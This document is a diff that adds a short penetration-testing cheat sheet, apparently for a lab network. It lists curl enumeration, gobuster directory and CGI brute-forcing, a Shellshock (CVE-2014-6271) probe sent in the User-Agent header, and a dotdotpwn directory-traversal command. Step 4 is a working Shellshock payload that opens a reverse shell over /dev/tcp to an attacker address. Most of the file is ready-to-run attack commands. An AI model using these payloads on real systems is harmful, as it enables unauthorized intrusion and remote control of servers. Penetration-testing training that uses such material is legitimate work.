@@ -1,0 +1,27 @@
+1. Curl enum
+
+curl -i 10.11.1.31
+curl -i -L 10.11.1.31
+curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+curl 10.11.1.71 -s -L | html2text -width '99' | uniq
+
+2.URL bruteforcing using gobuster
+
+gobuster -u http://10.11.1.71/ \
+  -w /usr/share/wordlist/dirb/common.txt \
+  -s '200,204,301,302,307,403,500' -e
+
+3. URL bruteforcing for for CGI 
+gobuster -u http://10.11.1.71/ \
+  -w /usr/share/wordlists/dirb/vulns/cgis.txt \
+  -s '200,204,301,302,307,403,500' -e
+
+3. To check the shellock vulnerability , sending POC to check false positive
+curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://10.11.1.71/cgi-bin/admin.cgi
+
+4. Reverse shell without netcat
+curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/10.11.0.4/443 0>&1; echo zzzz;'" \
+  http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
+
+5. Directory traversal dotdotpwn
+/dotdotpwn.pl -m  http-url -S -u https://localhost/mutillidae/index.php?page=TRAVERSAL -k root -o unix 
